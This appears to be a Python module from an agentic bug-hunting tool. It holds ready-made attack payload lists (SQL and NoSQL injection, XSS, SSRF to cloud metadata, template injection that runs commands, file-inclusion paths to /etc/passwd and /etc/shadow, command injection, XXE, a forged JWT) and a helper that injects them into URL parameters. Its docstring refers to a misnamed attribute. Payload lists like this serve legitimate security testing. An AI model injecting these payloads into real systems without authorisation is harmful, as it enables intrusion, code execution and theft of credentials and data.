"""Pre-built attack payloads for agentic bug discovery.

Eliminates the need for agents to ask models for payloads.
All payloads are pre-validated and categorized.
Agents just pick and inject — no LLM calls needed.
"""


class Payloads:
    """Pre-built attack payloads organized by vulnerability type.
    
    Usage:
        from hunter.core.payloads import Payloads
        
        for payload in Payloads.sqli:
            test_url = inject_param(url, "id", payload)
            # test it
    """

    # SQL Injection payloads
    SQLI = [
        "'",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "1' OR 1=1 --",
        "admin' --",
        "1; SELECT * FROM users",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",
        "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "1; EXEC xp_cmdshell('whoami')--",
        "'; EXEC master..xp_cmdshell--",
    ]

    # XSS payloads
    XSS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<IMG SRC=j&#X41vascript:alert('test')>",
        "<details open ontoggle=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<math><mtext></mtext><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">",
        "';alert(1)//",
        "\";alert(1)//",
        "-prompt(8)-",
        "'-prompt(8)-'",
        "<svg/onload=prompt(8)>",
        "\"onmouseover=prompt(8)>",
        "<img src=x onerror=prompt(8)>",
    ]

    # SSRF payloads
    SSRF = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://100.100.100.200/latest/meta-data/",
        "http://metadata.google.internal",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://instance-data/latest/meta-data/",
        "http://fd00:ec2::254",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:3000",
        "http://127.0.0.1:9200",
    ]

    # SSTI payloads
    SSTI = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{7*7}",
        "*{7*7}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    ]

    # Open Redirect payloads
    OPEN_REDIRECT = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "///evil.com",
        "////evil.com",
        "https:evil.com",
        "//evil.com/%2f..",
        "/%09/evil.com",
        "/%2f%2fevil.com",
        "/evil.com/%2f..",
        "javascript:alert(document.domain)",
        "//evil.com",
        "///evil.com",
        "////evil.com",
        "https://evil.com%00.example.com",
        "https://evil.com%23.example.com",
    ]

    # LFI payloads
    LFI = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\etc\\passwd",
        "/etc/passwd",
        "file:///etc/passwd",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",
        "/etc/shadow",
        "/etc/hosts",
        "C:\\Windows\\system32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "expect://id",
        "data://text/plain;base64,SSBsb3ZlIFBIUAo=",
    ]

    # Command Injection payloads
    CMDI = [
        ";id",
        "|id",
        "||id",
        "&id",
        "&&id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; ping -c 3 YOUR_DOMAIN",
        "| ping -c 3 YOUR_DOMAIN",
        "${IFS}id",
        "%0aid",
        "%0a id",
        "; sleep 5",
        "| sleep 5",
        "'; sleep 5; '",
        "\"; sleep 5; \"",
    ]

    # Header injection
    HEADER_INJECTION = [
        "evil.com",
        "evil.com\r\nX-Injected: true",
        "evil.com\r\n\r\n<script>alert(1)</script>",
        "%0d%0aX-Injected:%20true",
        "\r\n evil.com",
    ]

    # Prototype Pollution
    PROTO_POLLUTION = [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '{"__proto__":{"toString":"alert(1)"}}',
        '{"__proto__":{"polluted":"yes"}}',
    ]

    # JWT attacks
    JWT_ATTACKS = [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        # alg:none attack - signature stripped
    ]

    # NoSQL Injection
    NOSQLI = [
        '{"$gt":""}',
        '{"$ne":""}',
        '{"$regex":".*"}',
        "true, $where: '1 == 1'",
        '{"$gt": -1}',
        '{"username":{"$ne":""},"password":{"$ne":""}}',
    ]

    # XXE payloads
    XXE = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    ]

    @classmethod
    def get(cls, vuln_type: str) -> list[str]:
        """Get payloads by vulnerability type.
        
        Args:
            vuln_type: sqli, xss, ssrf, ssti, redirect, lfi, cmdi, header, proto, jwt, nosqli, xxe
        """
        mapping = {
            "sqli": cls.SQLI,
            "xss": cls.XSS,
            "ssrf": cls.SSRF,
            "ssti": cls.SSTI,
            "redirect": cls.OPEN_REDIRECT,
            "lfi": cls.LFI,
            "cmdi": cls.CMDI,
            "header": cls.HEADER_INJECTION,
            "proto": cls.PROTO_POLLUTION,
            "jwt": cls.JWT_ATTACKS,
            "nosqli": cls.NOSQLI,
            "xxe": cls.XXE,
        }
        return mapping.get(vuln_type.lower(), [])

    @classmethod
    def inject_url(cls, url: str, param: str, payload: str) -> str:
        """Inject a payload into a URL parameter."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    @classmethod
    def all_types(cls) -> list[str]:
        """List all available payload types."""
        return ["sqli", "xss", "ssrf", "ssti", "redirect", "lfi", "cmdi",
                "header", "proto", "jwt", "nosqli", "xxe"]
